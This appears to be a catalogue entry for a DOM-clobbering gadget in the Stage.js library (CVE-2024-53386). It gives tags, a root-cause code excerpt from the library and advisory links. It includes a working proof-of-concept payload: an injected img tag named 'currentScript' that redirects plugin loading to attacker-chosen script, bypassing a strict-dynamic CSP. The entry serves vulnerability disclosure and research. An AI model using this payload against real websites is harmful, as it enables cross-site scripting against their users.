---
description: Stage.js is a lightweight and fast 2D rendering and layout library for web and mobile game development.
github: piqnt/stage.js
gadgets:
  ≤0.8.10:
    cve: CVE-2024-53386
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - strict-dynamic-csp
      - before-func-call
    pocs:
      - description: The [Stage.js](https://github.com/piqnt/stage.js) library was using `document.currentScript` as a reference to load plugins.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/stage.js/0.8.10/stage.web.js"></script>
          <script nonce="secret">
            Stage.preload("./index.js");
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/piqnt/stage.js/blob/a1d7da8b8ebccfba4159ff8f986578dfd988a22c/lib/core.js#L155-L206">https://github.com/piqnt/stage.js/blob/a1d7da8b8ebccfba4159ff8f986578dfd988a22c/lib/core.js#L155-L206</a>

      ```javascript
      function getScriptSrc() {
        // HTML5
        if (document.currentScript) {
          return document.currentScript.src;
        }

        // [...]

        return function(url) {
          if (/^\.\//.test(url)) {
            var src = getScriptSrc();
            var base = src.substring(0, src.lastIndexOf('/') + 1);
            url = base + url.substring(2);
            // } else if (/^\.\.\//.test(url)) {
            // url = base + url;
          }
          return url;
        };
      ```
    links:
      - https://github.com/advisories/GHSA-fp3m-g5rc-4c28
      - https://gist.github.com/jackfromeast/31d56f1ad17673aabb6ab541e65a5534
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/stage.js.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
